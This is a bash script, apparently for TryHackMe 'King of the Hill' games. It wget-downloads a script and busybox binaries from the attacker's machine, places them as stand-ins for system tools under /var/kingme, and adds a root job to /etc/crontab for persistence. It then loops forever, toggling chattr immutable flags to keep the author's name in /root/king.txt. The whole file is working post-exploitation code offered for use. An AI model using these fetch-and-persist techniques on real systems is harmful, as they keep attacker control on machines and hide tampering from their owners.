#!/bin/bash
#
# /$$   /$$ /$$$$$$ /$$   /$$  /$$$$$$        /$$      /$$ /$$$$$$$$
#| $$  /$$/|_  $$_/| $$$ | $$ /$$__  $$      | $$$    /$$$| $$_____/
#| $$ /$$/   | $$  | $$$$| $$| $$  \__/      | $$$$  /$$$$| $$      
#| $$$$$/    | $$  | $$ $$ $$| $$ /$$$$      | $$ $$/$$ $$| $$$$$   
#| $$  $$    | $$  | $$  $$$$| $$|_  $$      | $$  $$$| $$| $$__/   
#| $$\  $$   | $$  | $$\  $$$| $$  \ $$      | $$\  $ | $$| $$      
#| $$ \  $$ /$$$$$$| $$ \  $$|  $$$$$$/      | $$ \/  | $$| $$$$$$$$
#|__/  \__/|______/|__/  \__/ \______/       |__/     |__/|________/ v0.3                         
#
# Auto king script for THM KotH
# Written by Squ1rr3l (aka redsquirrel_7)
#
# DISCLAIMER: I'm pretty sure this isn't against the rules, but
# I am not responsible if you get banned for using this script!

HACKER_NAME=username	# Put your THM username here
HACKER_IP=127.0.0.1	# Put the IP of your attacker machine here

# Set us up a secret working directory
mkdir /var/kingme
cd /var/kingme

# Copy all the bins here and the kingme script as a backup
#
# Gotta figure out how to check for curl and wget
# and automatically decide which commands to use.
#curl -o "kingme.sh" $HACKER_IP:8080/kingme.sh
#curl -o "grep" $HACKER_IP:8080/busybox_GREP
#curl -o "echo" $HACKER_IP:8080/busybox_ECHO
#curl -o "chattr" $HACKER_IP:8080/busybox_CHATTR
#curl -o "chmod" $HACKER_IP:8080/busybox_CHMOD
#curl -o "cat" $HACKER_IP:8080/busybox_CAT

# Uncomment these wget commands if curl is not the VM
wget http://$HACKER_IP:8080/kingme.sh
wget http://$HACKER_IP:8080/busybox_GREP
wget http://$HACKER_IP:8080/busybox_ECHO
wget http://$HACKER_IP:8080/busybox_CHATTR
wget http://$HACKER_IP:8080/busybox_CHMOD
wget http://$HACKER_IP:8080/busybox_CAT
#wget http://$HACKER_IP:8080/kingcron.sh

mv -v busybox_GREP grep
mv -v busybox_ECHO echo
mv -v busybox_CHATTR chattr
mv -v busybox_CHMOD chmod
mv -v busybox_CAT cat

chmod u+x kingme.sh
chmod u+x grep
chmod u+x echo
chmod u+x chattr
chmod u+x chmod
chmod u+x cat
#chmod u+x kingcron.sh

# Make sure our script runs again even if our shell gets borked
/var/kingme/echo -e "#!/bin/bash\n# Just in case our shell gets borked\n# to be run as a cron job\n#\nHACKER_NAME=$HACKER_NAME\n\nif /var/kingme/grep -q $HACKER_NAME /root/king.txt; then\n	echo "you are king"\n	exit\nelse\n	while true\n	do\n		if /var/kingme/grep -q $HACKER_NAME /root/king.txt; then\n			/var/kingme/echo $HACKER_NAME "is king! Nothing to do!"\n		else\n			/var/kingme/chattr -ai /root/king.txt\n			/var/kingme/chmod u+w /root/king.txt\n			set +o noclobber /root/king.txt\n			/var/kingme/echo $HACKER_NAME > /root/king.txt\n			/var/kingme/chattr +ai /root/king.txt\n			set -o noclobber /root/king.txt\n		fi\n		sleep 1\n	done\nfi\n" > /var/kingme/kingcron.sh

/var/kingme/chmod u+x /var/kingme/kingcron.sh
/var/kingme/echo "* * * * *  root  /var/kingme/kingcron.sh" >> /etc/crontab


# Forever take your rightful throne as king!!!
while true
do
	if /var/kingme/grep -q $HACKER_NAME /root/king.txt; then
		/var/kingme/echo $HACKER_NAME "is king! Nothing to do!"
	else
		LOSER=$(/var/kingme/cat /root/king.txt)
		/var/kingme/echo $LOSER "dethroned you! Making" $HACKER_NAME "king once again!"
		/var/kingme/chattr -ai /root/king.txt
		/var/kingme/chmod u+w /root/king.txt
		set +o noclobber /root/king.txt
		/var/kingme/echo $HACKER_NAME > /root/king.txt
		/var/kingme/chattr +ai /root/king.txt
		set -o noclobber /root/king.txt
	fi
	sleep 1
done
